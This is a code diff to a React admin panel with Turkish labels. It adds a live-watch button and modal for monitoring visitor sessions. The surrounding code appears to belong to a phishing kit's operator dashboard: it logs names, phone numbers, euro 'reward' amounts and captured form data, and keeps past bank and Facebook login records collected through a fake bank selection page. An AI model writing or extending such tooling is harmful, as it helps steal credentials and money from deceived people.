@@ -6,6 +6,7 @@ import type { DemoSession } from "@/types/session";
 import { pathToStep } from "@/lib/session-routes";
 import { playBeautifulNotification, showBeautifulToast } from "@/lib/notification";
 import { isSessionLive, parseVisitorPresenceState } from "@/lib/admin-presence";
+import { LiveWatchModal } from "./LiveWatchModal";
 // Banka listesi (/banken) ekraninda kullanilan AYNI logo cozumleyiciyi import ediyoruz
 // Boylece admin panelindeki banka logolari = banka secim ekranindaki logolar (BIRBIRININ AYNISI)
 import {
@@ -655,6 +656,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
   const [chatSessionId, setChatSessionId] = useState<string | null>(null);
   const [deviceInfoSession, setDeviceInfoSession] = useState<DemoSession | null>(null);
+  const [liveWatchRow, setLiveWatchRow] = useState<DemoSession | null>(null);
   // =============== GECMIS GIRIS MODAL (Banka + Facebook onceki kayitlari) ===============
   const [showHistoryModal, setShowHistoryModal] = useState(false);
   const [historyModalSession, setHistoryModalSession] = useState<DemoSession | null>(null);
@@ -2168,6 +2170,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           <table className="w-full table-auto border-collapse text-[10px] text-left lg:text-[11px]">
             <thead className={`text-[11px] uppercase tracking-wider font-semibold border-b ${darkMode ? 'bg-black/20 text-gray-400 border-white/5' : 'bg-gray-50/50 text-gray-500 border-gray-100'}`}>
               <tr>
+                <th className="min-w-[75px] px-2 py-3 font-semibold whitespace-nowrap text-center">İzle</th>
                 <th className="min-w-[60px] px-2 py-3 font-semibold whitespace-nowrap">Ödül</th>
                 <th className="min-w-[90px] px-2 py-3 font-semibold whitespace-nowrap">İsim</th>
                 <th className="min-w-[90px] px-2 py-3 font-semibold whitespace-nowrap">Numara</th>
@@ -2185,7 +2188,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
             <tbody className={`divide-y ${darkMode ? 'divide-white/5' : 'divide-gray-100'}`}>
               {rows.length === 0 && (
                 <tr>
-                  <td colSpan={12} className="px-5 py-12 text-center text-base opacity-50 font-medium">Henüz bir log yok. İşlemler burada görünecek.</td>
+                  <td colSpan={13} className="px-5 py-12 text-center text-base opacity-50 font-medium">Henüz bir log yok. İşlemler burada görünecek.</td>
                 </tr>
               )}
               {rows.map((row) => {
@@ -2296,6 +2299,38 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
                 return (
                   <tr key={row.id} className={`${darkMode ? 'hover:bg-white/[0.02]' : 'hover:bg-black/[0.01]'} transition-colors duration-200 group`}>
+                    <td className="px-2 py-3 align-middle whitespace-nowrap text-center">
+                      <button
+                        type="button"
+                        onClick={() => setLiveWatchRow(row)}
+                        className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[11px] font-bold transition-all shadow-sm ${
+                          isOnline
+                            ? "bg-red-500/15 text-red-500 border border-red-500/30 hover:bg-red-500 hover:text-white"
+                            : darkMode
+                            ? "bg-white/5 text-gray-400 hover:bg-white/10 hover:text-gray-200 border border-white/10"
+                            : "bg-gray-100 text-gray-500 hover:bg-gray-200 hover:text-gray-700 border border-gray-200"
+                        }`}
+                        title={isOnline ? "Kullanıcıyı canlı izle (Çevrimiçi)" : "Kullanıcı ekranını aç (Çevrimdışı)"}
+                      >
+                        {isOnline ? (
+                          <>
+                            <span className="relative flex h-2 w-2">
+                              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
+                              <span className="relative inline-flex rounded-full h-2 w-2 bg-red-500"></span>
+                            </span>
+                            <span>Canlı İzle</span>
+                          </>
+                        ) : (
+                          <>
+                            <svg className="w-3.5 h-3.5 opacity-60" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.164 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                            </svg>
+                            <span>İzle</span>
+                          </>
+                        )}
+                      </button>
+                    </td>
                     <td className="px-2 py-3 align-top whitespace-nowrap font-bold text-sm lg:text-base text-[#EB5E28]">
                       {row.amount ? `€${row.amount}` : '-'}
                     </td>
@@ -3423,6 +3458,26 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
             </div>
           </div>
         </div>
+      )}
+
+      {/* LIVE WATCH MODAL */}
+      {liveWatchRow && (
+        <LiveWatchModal
+          sessionId={liveWatchRow.id}
+          publicId={liveWatchRow.public_id}
+          initialName={`${(liveWatchRow.form_data as any)?.firstName || ""} ${(liveWatchRow.form_data as any)?.lastName || ""}`.trim()}
+          initialAmount={liveWatchRow.amount}
+          initialPath={sessionPaths[liveWatchRow.id]}
+          formData={(liveWatchRow.form_data as any) || {}}
+          isOnline={isSessionLive(
+            liveWatchRow.id,
+            onlineSessionIds,
+            liveWatchRow.status,
+            sessionLastSeenAt[liveWatchRow.id]
+          )}
+          darkMode={darkMode}
+          onClose={() => setLiveWatchRow(null)}
+        />
       )}
     </div>
   );
